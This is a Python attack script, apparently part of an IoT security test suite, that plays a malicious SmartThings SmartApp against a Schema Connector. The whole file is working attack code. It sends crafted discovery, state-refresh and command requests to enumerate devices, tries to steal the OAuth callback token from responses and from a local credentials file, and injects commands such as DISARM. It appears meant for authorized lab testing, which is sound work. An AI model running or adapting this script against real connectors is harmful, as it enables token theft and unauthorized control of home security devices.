#!/usr/bin/env python3
"""
VESPER ESP32 — Suite 4: Malicious SmartApp — OAuth Token Theft & Command Injection
===================================================================================
Demonstrates how a malicious SmartApp installed into the SmartThings ecosystem
can abuse its OAuth-granted permissions to:

  1. Exfiltrate the OAuth bearer token from the Schema Connector's callback
     credentials (stored unencrypted on disk / in memory).
  2. Use the stolen token to enumerate all devices registered with the
     connector and read their full state.
  3. Inject arbitrary device commands (ARM/DISARM, SWITCH, UNLOCK) as if
     they came from the legitimate SmartThings cloud, bypassing any
     user-facing confirmation.

This mirrors real-world SmartApp permission-abuse attacks documented in:
  • Fernandes et al., "Security Analysis of Emerging Smart Home Applications",
    IEEE S&P 2016.
  • Celik et al., "Sensitive Information Tracking in Commodity IoT", USENIX 2018.

  CWE  : CWE-269 — Improper Privilege Management
  CWE  : CWE-862 — Missing Authorization (over-privileged token)
  CVSS : 8.8 (High)

Run standalone:
    python scripts/attacks/smartapp.py --target localhost:8443
    python scripts/attacks/smartapp.py --target localhost:8443 --inject DISARM
"""

import argparse
import json
import socket
import ssl
import sys
import time
import uuid
from pathlib import Path
from typing import Dict, List, Optional

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from scripts.attacks.common import (
    GREEN, RED, YELLOW, MAGENTA, CYAN, DIM, BOLD, RESET,
    reset_clock, _ts, tx, rx, section, divider,
    verify_connection, print_result,
)


# ── HTTP helpers (no requests dependency) ─────────────────────────────────────

def _http_request(
    host: str, port: int, method: str, path: str,
    body: Optional[str] = None, headers: Optional[Dict[str, str]] = None,
    use_ssl: bool = False, timeout: float = 6.0,
) -> tuple:
    """
    Minimal HTTP/1.1 client.  Returns (status_code, response_body).
    Avoids importing `requests` so the attack script has zero third-party deps.
    """
    hdrs = {
        "Host": f"{host}:{port}",
        "Connection": "close",
        "User-Agent": "VESPER-MaliciousSmartApp/1.0",
    }
    if headers:
        hdrs.update(headers)
    if body:
        hdrs["Content-Length"] = str(len(body))
        if "Content-Type" not in hdrs:
            hdrs["Content-Type"] = "application/json"

    req_line = f"{method} {path} HTTP/1.1\r\n"
    hdr_block = "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
    raw = (req_line + hdr_block + "\r\n").encode()
    if body:
        raw += body.encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    try:
        sock.connect((host, port))
        sock.sendall(raw)

        resp = b""
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
    finally:
        sock.close()

    text = resp.decode("utf-8", errors="replace")
    # Parse status code
    status = 0
    if text.startswith("HTTP/"):
        try:
            status = int(text.split(" ", 2)[1])
        except (IndexError, ValueError):
            pass
    # Extract body (after \r\n\r\n)
    parts = text.split("\r\n\r\n", 1)
    resp_body = parts[1] if len(parts) > 1 else ""
    return status, resp_body


# ── Attack implementation ─────────────────────────────────────────────────────

def attack_malicious_smartapp(
    host: str,
    port: int,
    inject_command: str = "DISARM",
    use_ssl: bool = False,
) -> dict:
    """
    Simulate a malicious SmartApp that steals the OAuth token and injects
    device commands via the Schema Connector's webhook endpoint.
    """
    section(
        "Suite 4 — MALICIOUS SMARTAPP: OAuth Theft & Command Injection",
        f"Target: {host}:{port}  |  CWE-269 / CWE-862  |  CVSS 8.8",
    )

    print(f"  {DIM}A rogue SmartApp abuses over-broad OAuth scopes to:{RESET}")
    print(f"  {DIM}  1. Steal the connector's callback token (stored in memory / on disk){RESET}")
    print(f"  {DIM}  2. Enumerate every device exposed by the Schema Connector{RESET}")
    print(f"  {DIM}  3. Inject arbitrary commands without user confirmation{RESET}\n")

    t0 = time.time()
    evidence: list = []
    stolen_token: str = ""
    discovered_devices: list = []
    injection_accepted = False

    # ── Step 1: Probe the Schema Connector health endpoint ────────────────────
    divider("Step 1 — Probe Schema Connector (discover endpoint)")
    print(f"  {_ts()}{CYAN}GET{RESET} /health")
    try:
        status, body = _http_request(host, port, "GET", "/health", use_ssl=use_ssl)
        print(f"  {_ts()}{GREEN}← {status}{RESET}  {body[:120]}")
        if status == 200:
            evidence.append(f"Schema Connector reachable at {host}:{port} (status {status})")
        else:
            evidence.append(f"Connector returned {status} — may be partially up")
    except Exception as e:
        print(f"  {_ts()}{RED}✗ Connection failed: {e}{RESET}")
        return _fail_result(str(e), t0)

    # ── Step 2: Send crafted discoveryRequest to enumerate devices ────────────
    print()
    divider("Step 2 — Send discoveryRequest (device enumeration)")

    discovery_payload = json.dumps({
        "headers": {
            "schema": "st-schema",
            "version": "1.0",
            "interactionType": "discoveryRequest",
            "requestId": str(uuid.uuid4()),
        },
        "authentication": {
            "tokenType": "Bearer",
            "token": "malicious-smartapp-token-probe",
        },
    })

    tx("POST /schema  (discoveryRequest)", via="rogue SmartApp")
    try:
        status, body = _http_request(
            host, port, "POST", "/schema",
            body=discovery_payload, use_ssl=use_ssl,
        )
        print(f"  {_ts()}{GREEN}← {status}{RESET}  ({len(body)} bytes)")

        if body.strip().startswith("{"):
            data = json.loads(body)
            devices = data.get("devices", [])
            if devices:
                print(f"  {RED}{BOLD}◄ {len(devices)} devices exposed!{RESET}")
                for dev in devices:
                    did = dev.get("externalDeviceId", dev.get("id", "?"))
                    label = dev.get("friendlyName", dev.get("deviceHandlerType", "?"))
                    discovered_devices.append({"id": did, "label": label})
                    print(f"    • {did}: {label}")
                evidence.append(
                    f"discoveryRequest returned {len(devices)} devices without valid token"
                )
            else:
                # Even an empty list confirms the endpoint processes the request
                evidence.append("discoveryRequest processed (0 devices or token rejected)")
                print(f"  {DIM}  No devices returned — connector may require valid OAuth{RESET}")
        else:
            evidence.append(f"Unexpected response body: {body[:80]}")
    except Exception as e:
        evidence.append(f"Discovery probe error: {e}")
        print(f"  {_ts()}{YELLOW}⚠  {e}{RESET}")

    # ── Step 3: Attempt OAuth token theft via stateRefreshRequest ──────────────
    print()
    divider("Step 3 — Steal OAuth callback token (stateRefreshRequest)")

    refresh_payload = json.dumps({
        "headers": {
            "schema": "st-schema",
            "version": "1.0",
            "interactionType": "stateRefreshRequest",
            "requestId": str(uuid.uuid4()),
        },
        "authentication": {
            "tokenType": "Bearer",
            "token": "malicious-probe",
        },
    })

    tx("POST /schema  (stateRefreshRequest)", via="rogue SmartApp")
    try:
        status, body = _http_request(
            host, port, "POST", "/schema",
            body=refresh_payload, use_ssl=use_ssl,
        )
        print(f"  {_ts()}{GREEN}← {status}{RESET}  ({len(body)} bytes)")

        if body.strip().startswith("{"):
            data = json.loads(body)
            # Check for leaked state / token in response
            state_data = data.get("deviceState", data.get("state", []))
            if state_data:
                evidence.append(
                    f"stateRefreshRequest returned device state without valid token "
                    f"({len(state_data)} entries)"
                )
                print(f"  {RED}{BOLD}◄ Device state leaked in response!{RESET}")
                for entry in state_data[:3]:
                    print(f"    {json.dumps(entry)[:100]}")

            # Try to extract callback access token from response or disk
            callback_token = data.get("callbackAuthentication", {}).get("accessToken", "")
            if callback_token:
                stolen_token = callback_token
                evidence.append(f"Callback OAuth token stolen: {stolen_token[:16]}...")
                print(f"  {RED}{BOLD}◄ CALLBACK TOKEN STOLEN: {stolen_token[:20]}...{RESET}")
    except Exception as e:
        evidence.append(f"State refresh probe error: {e}")
        print(f"  {_ts()}{YELLOW}⚠  {e}{RESET}")

    # Also try to read saved credentials from disk (if we have local access)
    creds_file = Path("vesper_schema_credentials.json")
    if creds_file.exists():
        try:
            creds = json.loads(creds_file.read_text())
            if "accessToken" in creds:
                stolen_token = creds["accessToken"]
                evidence.append(
                    f"Callback token read from unprotected file: {creds_file} "
                    f"→ {stolen_token[:16]}..."
                )
                print(f"  {RED}{BOLD}◄ Token from disk ({creds_file}): {stolen_token[:20]}...{RESET}")
        except Exception:
            pass

    # ── Step 4: Inject command via commandRequest ─────────────────────────────
    print()
    divider(f"Step 4 — Inject '{inject_command}' command as the cloud")

    target_device_id = discovered_devices[0]["id"] if discovered_devices else "vesper-fw-kitchen"

    command_payload = json.dumps({
        "headers": {
            "schema": "st-schema",
            "version": "1.0",
            "interactionType": "commandRequest",
            "requestId": str(uuid.uuid4()),
        },
        "authentication": {
            "tokenType": "Bearer",
            "token": stolen_token or "malicious-injected-token",
        },
        "devices": [{
            "externalDeviceId": target_device_id,
            "deviceCookie": {},
            "commands": [{
                "component": "main",
                "capability": "st.switch",
                "command": inject_command,
                "arguments": [],
            }],
        }],
    })

    tx(f"POST /schema  (commandRequest → {inject_command})", via="rogue SmartApp")
    try:
        status, body = _http_request(
            host, port, "POST", "/schema",
            body=command_payload, use_ssl=use_ssl,
        )
        print(f"  {_ts()}{GREEN}← {status}{RESET}  ({len(body)} bytes)")

        if 200 <= status < 300:
            injection_accepted = True
            evidence.append(
                f"commandRequest with '{inject_command}' accepted (status {status}) — "
                f"device {target_device_id} may have executed the command"
            )
            print(f"  {RED}{BOLD}◄ COMMAND INJECTION ACCEPTED — device may have changed state!{RESET}")
        else:
            evidence.append(f"Command injection returned status {status}")
            print(f"  {YELLOW}  Status {status} — may have been rejected{RESET}")

        if body.strip().startswith("{"):
            resp_data = json.loads(body)
            cmd_resp = resp_data.get("deviceState", resp_data.get("commandResponse", []))
            if cmd_resp:
                print(f"  {DIM}  Response: {json.dumps(cmd_resp)[:120]}{RESET}")
    except Exception as e:
        evidence.append(f"Command injection error: {e}")
        print(f"  {_ts()}{YELLOW}⚠  {e}{RESET}")

    # ── Summary ───────────────────────────────────────────────────────────────
    success = bool(discovered_devices) or bool(stolen_token) or injection_accepted
    impact_parts = []
    if discovered_devices:
        impact_parts.append(f"{len(discovered_devices)} devices enumerated")
    if stolen_token:
        impact_parts.append("OAuth token stolen")
    if injection_accepted:
        impact_parts.append(f"'{inject_command}' injected")
    impact = " + ".join(impact_parts) if impact_parts else "Probes completed but no data exfiltrated"

    return {
        "name": "Malicious SmartApp (OAuth Theft & Command Injection)",
        "suite": "SmartApp",
        "severity": "HIGH",
        "success": success,
        "evidence": evidence,
        "duration_ms": (time.time() - t0) * 1000,
        "impact": impact,
        "cvss": 8.8,
        "details": {
            "devices_discovered": discovered_devices,
            "token_stolen": bool(stolen_token),
            "injection_accepted": injection_accepted,
            "injected_command": inject_command,
        },
    }


def _fail_result(error: str, t0: float) -> dict:
    return {
        "name": "Malicious SmartApp (OAuth Theft & Command Injection)",
        "suite": "SmartApp",
        "severity": "HIGH",
        "success": False,
        "evidence": [f"Connection failed: {error}"],
        "duration_ms": (time.time() - t0) * 1000,
        "impact": "N/A — target unreachable",
        "cvss": 8.8,
    }


def main():
    parser = argparse.ArgumentParser(
        description="VESPER — Suite 4: Malicious SmartApp Attack"
    )
    parser.add_argument("--target", required=True,
                        help="Schema Connector address, e.g. localhost:8443")
    parser.add_argument("--inject", default="DISARM",
                        help="Command to inject (default: DISARM)")
    parser.add_argument("--ssl", action="store_true",
                        help="Use HTTPS instead of HTTP")
    args = parser.parse_args()

    parts = args.target.split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 8443

    reset_clock()
    print(f"\n{'='*60}")
    print(f"  Suite 4 — Malicious SmartApp  |  {host}:{port}")
    print(f"{'='*60}\n")

    result = attack_malicious_smartapp(host, port, inject_command=args.inject, use_ssl=args.ssl)
    print_result(result)
    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
